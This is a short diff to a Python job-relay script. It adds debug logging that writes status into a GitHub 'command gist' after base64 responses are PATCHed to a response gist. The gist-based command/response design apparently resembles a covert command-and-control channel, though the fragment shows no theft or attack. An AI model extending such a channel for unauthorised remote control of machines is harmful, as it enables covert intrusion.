@@ -56,6 +56,13 @@ def send_response(job_id, response_b64):
             log(f'PATCH error body: {r.text[:500]}')
         r.raise_for_status()
         log(f'Response sent for {job_id}: {len(response_b64)} bytes')
+        
+        # Also write to command gist for debugging
+        debug_payload = {'id': job_id, 'response': f'DEBUG: sent to gist {response_gist}, size={len(response_b64)}'}
+        debug_content = json.dumps(debug_payload)
+        debug_data = {'files': {'response.json': {'content': debug_content}}}
+        r2 = session.patch(f'https://api.github.com/gists/{command_gist}', json=debug_data, timeout=15)
+        log(f'DEBUG PATCH to command gist: {r2.status_code}')
     except Exception as e:
         log(f'send_response error: {e}')
 
